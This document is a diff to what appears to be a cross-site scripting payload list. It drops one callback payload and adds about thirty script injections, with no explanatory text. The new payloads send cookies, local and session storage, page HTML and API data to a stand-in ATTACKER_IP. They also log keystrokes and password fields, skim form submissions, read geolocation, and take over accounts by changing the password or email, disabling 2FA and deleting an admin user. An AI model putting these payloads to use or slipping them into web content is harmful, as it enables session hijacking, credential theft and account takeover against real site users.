@@ -1,4 +1,31 @@
-"><script>
-var i=new Image();
-i.src='https://CALLBACK/?'+btoa(document.location+'|'+document.cookie+'|'+document.title+'|'+navigator.userAgent);
-</script>
+<script>new Image().src='http://ATTACKER_IP/?c='+document.cookie</script>
+<script>fetch('http://ATTACKER_IP/?c='+btoa(document.cookie))</script>
+<script>navigator.sendBeacon('http://ATTACKER_IP/',document.cookie)</script>
+<script>fetch('http://ATTACKER_IP/',{method:'POST',body:document.cookie})</script>
+<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://ATTACKER_IP/');xhr.send(document.cookie);</script>
+<script>fetch('http://ATTACKER_IP/?c='+encodeURIComponent(document.cookie))</script>
+<script>new Image().src='http://ATTACKER_IP/?ls='+btoa(JSON.stringify(localStorage))</script>
+<script>var x={};for(var k in localStorage){x[k]=localStorage[k]};fetch('http://ATTACKER_IP/?ls='+btoa(JSON.stringify(x)))</script>
+<script>new Image().src='http://ATTACKER_IP/?ss='+btoa(JSON.stringify(sessionStorage))</script>
+<script>fetch('http://ATTACKER_IP/?html='+btoa(document.documentElement.outerHTML))</script>
+<script>fetch('http://ATTACKER_IP/?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie))</script>
+<script>fetch('/api/me').then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/?d='+btoa(d)))</script>
+<script>fetch('/api/users',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/?d='+btoa(d)))</script>
+<script>fetch('/api/admin',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/?d='+btoa(d)))</script>
+<script>document.querySelectorAll('input[type=password]').forEach(e=>{e.addEventListener('input',function(){new Image().src='http://ATTACKER_IP/?p='+encodeURIComponent(this.value)})})</script>
+<script>document.addEventListener('keypress',function(e){new Image().src='http://ATTACKER_IP/?k='+encodeURIComponent(e.key)})</script>
+<script>document.querySelectorAll('form').forEach(f=>{f.addEventListener('submit',function(){new Image().src='http://ATTACKER_IP/?form='+encodeURIComponent(new FormData(this))})})</script>
+<script>setInterval(function(){new Image().src='http://ATTACKER_IP/?ck='+encodeURIComponent(document.cookie)},5000)</script>
+<script>var link=document.createElement('link');link.rel='prefetch';link.href='http://ATTACKER_IP/?c='+document.cookie;document.head.appendChild(link);</script>
+<script>var s=document.createElement('script');s.src='http://ATTACKER_IP/?c='+document.cookie;document.head.appendChild(s);</script>
+<script>fetch('http://ATTACKER_IP/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,url:location.href,dom:btoa(document.body.innerHTML)})})</script>
+<script>navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){fetch('http://ATTACKER_IP/?lat='+p.coords.latitude+'&lng='+p.coords.longitude)})</script>
+<script>fetch('http://ATTACKER_IP/?title='+encodeURIComponent(document.title))</script>
+<script>fetch('http://ATTACKER_IP/?ref='+encodeURIComponent(document.referrer))</script>
+<script>fetch('http://ATTACKER_IP/?ua='+encodeURIComponent(navigator.userAgent))</script>
+<script>fetch('/api/csrf-token').then(r=>r.json()).then(d=>fetch('/api/password/change',{method:'POST',headers:{'X-CSRF-Token':d.token},body:JSON.stringify({password:'hacked'})}))</script>
+<script>fetch('/api/2fa/disable',{method:'POST',credentials:'include'})</script>
+<script>fetch('/api/user',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})</script>
+<script>fetch('/api/admin/user/1',{method:'DELETE',credentials:'include'})</script>
+<script>window.open('http://ATTACKER_IP/?c='+document.cookie)</script>
+<script>document.location='http://ATTACKER_IP/?c='+document.cookie</script>
